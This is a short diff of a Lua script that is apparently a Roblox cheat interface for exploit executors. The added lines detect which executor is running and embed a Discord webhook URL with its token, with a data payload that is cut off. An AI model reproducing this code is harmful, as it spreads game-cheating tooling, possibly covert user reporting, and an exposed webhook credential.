@@ -245,6 +245,13 @@ Close:NewKeybind("Close/Open UI", "Opens And Closes The Gui", Enum.KeyCode.G, fu
 end)
 
 
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
 local url =
    "https://discord.com/api/webhooks/1041990114533986384/Bzz7buTEWB4seQ1uqIcD-ad_a-_MteZSJU1EX6-LqA-YoHRdrCn6nhCKa5M3lgkq-fdc"
 local data = {
